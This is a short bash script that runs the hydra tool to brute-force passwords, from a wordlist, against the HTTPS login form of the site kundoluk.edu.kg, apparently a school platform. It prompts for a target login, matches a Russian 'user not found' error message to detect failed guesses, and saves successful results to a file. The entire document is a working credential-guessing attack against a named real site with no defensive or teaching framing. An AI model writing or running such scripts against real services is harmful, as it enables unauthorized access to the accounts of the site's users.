#!/bin/bash
echo "Enter Your Login"
read login
sudo hydra -l $login -P pass.txt kundoluk.edu.kg https-post-form "/account/login:login=^USER^&password=^PASS^&language=ru&type=default:Пользователя с такими данными не найдено." -vV -o file.txt
